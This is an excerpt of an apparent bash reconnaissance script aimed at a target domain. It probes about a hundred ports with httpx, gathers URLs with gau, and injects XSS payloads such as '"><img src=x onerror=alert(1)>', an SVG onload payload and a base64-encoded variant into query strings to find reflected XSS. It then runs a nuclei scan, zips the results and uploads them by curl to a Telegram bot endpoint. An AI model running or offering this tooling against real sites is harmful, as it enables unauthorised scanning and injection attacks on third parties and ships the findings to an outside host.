...
### lay domain chinh can recon
cat output/$cdir/$cdir.master | grep $domain_name > output/$cdir/$cdir.txt

############################################################################# FINDING LOGIN PORTALS  ##################################################################

echo -e "\e[36mHttpx running \e[0m"
...
httpx -silent -l output/$cdir/$cdir.txt -p 80,81,82,88,135,143,300,443,554,591,593,832,902,981,993,1010,1024,1311,2077,2079,2082,2083,2086,2087,2095,2096,2222,2480,3000,3128,3306,3333,3389,4243,4443,4567,4711,4712,4993,5000,5001,5060,5104,5108,5357,5432,5800,5985,6379,6543,7000,7170,7396,7474,7547,8000,8001,8008,8014,8042,8069,8080,8081,8083,8085,8088,8089,8090,8091,8118,8123,8172,8181,8222,8243,8280,8281,8333,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9100,9200,9443,9800,9981,9999 -fl 0 -include-chain -store-chain -sc -tech-detect -server -title -cdn -cname -probe -srd output/$cdir/raw_http_responses/ -o output/$cdir/temp_live.txtls > /dev/null 2>&1
httpx -silent -l output/$cdir/$cdir.txt -mc 404 -o output/$cdir/404.txt > /dev/null 2>&1
...
################################################### FINDING XSS AUTO ###################################################
echo -e "\e[36mFinding XSS \e[0m"
#cat output/$cdir/$cdir.txt | httpx -mc 200,400 -o output/$cdir/httpx.txt
mkdir output/$cdir/xss
#httpx -silent -l output/$cdir/$cdir.txt -mc 200,400,404,401 -o output/$cdir/xss/httpx.txt > /dev/null 2>&1
cat output/$cdir/$cdir.txt | gau --o output/$cdir/xss/endpoint.txt > /dev/null 2>&1
cat output/$cdir/xss/endpoint.txt | qsreplace '"><img src=x onerror=alert(1)>' | tee -a output/$cdir/xss/xss_fuzz.txt > /dev/null 2>&1
cat output/$cdir/xss/endpoint.txt | qsreplace 'Ij48c3ZnL29ubG9hZD1hbGVydCgxKT4=' | tee -a output/$cdir/xss/xss_fuzz.txt > /dev/null 2>&1
cat output/$cdir/xss/endpoint.txt | qsreplace '"><svg/onload=alert(1)>' | tee -a output/$cdir/xss/xss_fuzz.txt > /dev/null 2>&1
cat output/$cdir/xss/xss_fuzz.txt | freq | tee -a output/$cdir/xss/possible_xss.txt > /dev/null 2>&1

################################################## NUCLEI SCAN ##################################################
echo -e "\e[36mNuclei Scanning \e[0m"
mkdir output/$cdir/nuclei
nuclei -l output/$cdir/livesites.txtls -o output/$cdir/nuclei/nuclei.txt > /dev/null 2>&1
...
######### Zip Folder & Send Tele #########
echo -e "\e[36mZip Folder & Send Tele \e[0m"
zip -r output/$cdir/$cdir.zip output/$cdir/ > /dev/null 2>&1

curl -F document=@"output/$cdir/$cdir.zip" https://api.telegram.org/xxxxxx:yyyyyyyyyyyyyy/sendDocument?chat_id=-111111111111111111 > /dev/null 2>&1
